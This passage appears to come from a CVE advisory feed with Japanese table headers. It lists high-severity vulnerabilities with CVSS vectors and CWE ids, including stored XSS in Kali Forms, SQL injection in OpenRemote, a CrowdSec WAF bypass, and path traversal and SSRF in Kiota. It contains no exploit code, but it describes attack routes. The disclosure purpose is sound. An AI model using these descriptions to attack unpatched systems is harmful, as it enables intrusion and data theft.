| Vector | `CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-277` |
| Published | 2026-07-16T17:16:59.100 |

A potential insecure permissions vulnerability was reported in Legion Zone and the Lenovo App Store Windows applications, distributed exclusively in the Chinese market, that when installed on a non‑system partition, could allow a local user to execute arbitrary code.

### CVE-2026-15395

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-79` |
| Published | 2026-07-17T04:16:50.840 |

The Kali Forms — Contact Form & Drag-and-Drop Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'digitalSignature' Field Value in all versions up to, and including, 2.4.18 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. The required form-submission nonce is publicly available on any page containing the form shortcode, making this exploitable by fully unauthenticated attackers without any precondition beyond the form being published.

### CVE-2026-62238

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-07-17T02:18:11.613 |

OpenRemote before 1.26.0 contain an authenticated SQL injection vulnerability in the datapoint crosstab export endpoint that constructs PostgreSQL queries by concatenating asset display names into raw SQL. An authenticated attacker with asset creation or rename permissions can inject SQL through the asset name parameter and receive query results in the exported CSV response, enabling database data exfiltration.

### CVE-2026-44982

| 項目 | 値 |
|------|-----|
| CVSS | `7.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` |
| Weaknesses | `CWE-693` |
| Published | 2026-07-16T20:16:45.033 |

CrowdSec offers crowdsourced protection against malicious IPs. From 1.5.0 until 1.7.8, pkg/appsec/request.go NewParsedRequestFromRequest allocated a request body buffer from max(r.ContentLength, 0), so HTTP/1.1 requests using Transfer-Encoding: chunked and HTTP/2 requests without a content-length header produced an empty body and caused WAF rules targeting REQUEST_BODY, BODY_ARGS, ARGS_POST, JSON, or XML to be skipped. This issue is fixed in version 1.7.8.

### CVE-2026-22104

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:I/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-07-17T10:16:36.550 |

Improper access control in Hashtopolis server web-interface chunk activity component for versions prior to 0.14.8 allows any created account to read all cracked hashes of a Hashtopolis server instance.

### CVE-2026-62387

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-942` |
| Published | 2026-07-17T02:18:12.053 |

The Grav API plugin (getgrav/grav-plugin-api) before 1.0.0-rc.16 shipped Access-Control-Allow-Origin: * as its default CORS configuration on all responses, including authenticated endpoints and preflight (OPTIONS) responses. Because the plugin accepts credentials via the Authorization and X-API-Token headers (set programmatically by JavaScript rather than via cookies), an attacker who obtains a valid access token (e.g., via log leakage, Referer headers, browser history, or network capture) can issue fully authenticated cross-origin requests from any malicious website to read sensitive data and perform write operations as the token's user. Fixed in 1.0.0-rc.16.

### CVE-2026-62222

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-829` |
| Published | 2026-07-17T02:18:09.273 |

OpenClaw before 2026.5.22 contain a vulnerability in setup-mode discovery that allows loading of untrusted workspace plugins. Attackers with lower-trust caller access or control over configured input paths can execute or persist actions beyond their intended authorization level.

### CVE-2026-11889

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-07-16T21:17:19.050 |

SALTO ProAccess Space software using the tenancy feature / logical 
partition is vulnerable to a privilege escalation attack that could 
allow an authorized attacker to access any space managed by the affected
 product.

### CVE-2024-34268

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` |
| Weaknesses | `CWE-306` |
| Published | 2026-07-16T21:17:18.890 |

EQ-3 Eqiva CC-RT-BLE Bluetooth Smart Radiator Thermostat Firmware up to the latest version 1.46 was discovered to allow unsecured bluetooth connections. This vulnerability allows attackers to gain full access to the device without authentication.

### CVE-2026-63397

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-116` |
| Published | 2026-07-16T20:16:47.950 |

remorses/genql before version 6.3.4 allows an authenticated attacker with control of the GraphQL schema that is passed to genql to inject arbitrary JavaScript or TypeScript. The malicious code is injected into the generated schema.ts file and executes when the genql client is bundled and imported.

### CVE-2026-46336

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` |
| Weaknesses | `CWE-22;CWE-73` |
| Published | 2026-07-16T18:16:43.773 |

Manyfold is an open source, self-hosted web application for managing a collection of 3d models, particularly focused on 3d printing. From 0.96.0 until 0.140.0, authenticated users can rename uploaded files with path traversal sequences because app/models/model_file.rb uses the user-controlled filename in File.join(model.path, filename) without sufficient sanitization, allowing files to be moved or written outside the configured library directory. This issue is fixed in version 0.140.0.

### CVE-2026-59867

| 項目 | 値 |
|------|-----|
| CVSS | `7.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` |
| Weaknesses | `CWE-22;CWE-829;CWE-918` |
| Published | 2026-07-16T16:19:15.620 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.5, Kiota resolved OpenAPI $ref values by fetching remote http(s) URLs and reading local absolute or out-of-tree file paths, allowing `kiota generate` on an attacker-controlled or attacker-influenced description to perform build-time SSRF, remote file inclusion, and local file inclusion by inlining external schemas such as REMOTE_KIOTA_PROP or Leaked into generated clients. This issue is fixed in version 1.32.5 by AllowedExternalOriginsStreamLoader and the --allowed-external-origins option.

### CVE-2026-58598

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-362;CWE-416` |
| Published | 2026-07-16T22:17:50.330 |

Concurrent execution using shared resource with improper synchronization ('race condition') in Windows Backup Engine allows an authorized attacker to elevate privileges locally.

### CVE-2026-53410

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-367` |
| Published | 2026-07-16T21:17:21.377 |

A time-of-check to time-of-use (TOCTOU) race condition in the installation and uninstallation process of certain Zoom Clients for Windows could allow an authenticated local user to escalate privileges.

### CVE-2026-13104

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-250` |
| Published | 2026-07-16T17:16:55.090 |

A potential vulnerability was reported in Lenovo App Store, distributed exclusively in the Chinese market, that could allow a local authenticated user to execute arbitrary code with elevated privileges.

### CVE-2026-13103

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-16T17:16:54.950 |

A potential path traversal vulnerability was reported in Lenovo App Store, distributed exclusively in the Chinese market, that could allow a local authenticated user to execute arbitrary code.

### CVE-2026-59863

| 項目 | 値 |
|------|-----|
| CVSS | `7.0` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-16T15:16:35.707 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.5, Kiota honored a poisoned .kiota/workspace.json workspace configuration without validating per-client or per-plugin outputPath values during kiota client generate and kiota plugin generate, allowing a malicious repository or pull request to use absolute paths, rooted POSIX / paths, UNC \\ or // paths, Windows drive X:\ paths, or .. traversal segments to write generated client files outside the workspace root on a developer or CI host. This issue is fixed in version 1.32.5.
